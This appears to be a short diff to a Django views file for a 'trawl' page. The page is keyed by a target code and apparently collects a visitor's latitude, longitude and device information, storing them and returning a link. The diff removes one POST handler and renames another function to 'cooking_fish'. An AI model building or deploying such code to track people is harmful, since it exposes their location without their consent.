@@ -21,22 +21,10 @@ def index(request, code):
                 'myboy': data['target_code'],
                 'device_info': device_info
             }
-            return render(request, 'test_trawl_page.html',content)
-        if request.method == 'POST':
-            data = JSONParser().parse(request)
-            target_data = {
-                'target_code': data['myboy'],
-                "latitute": data['latitute'],
-                "longitude": data['longitude'],
-                "device_info": data['device_info'],
-                "message": data['msg'],
-
-            }
-            saving = save_trawls(target_data)
-            return JsonResponse({"success": saving['success'],"link":saving['link']})
+            return render(request, 'trawl_page.html',content)
 
 
-def test_page(request):
+def cooking_fish(request):
     if request.method == 'POST':
             data = JSONParser().parse(request)
             target_data = {
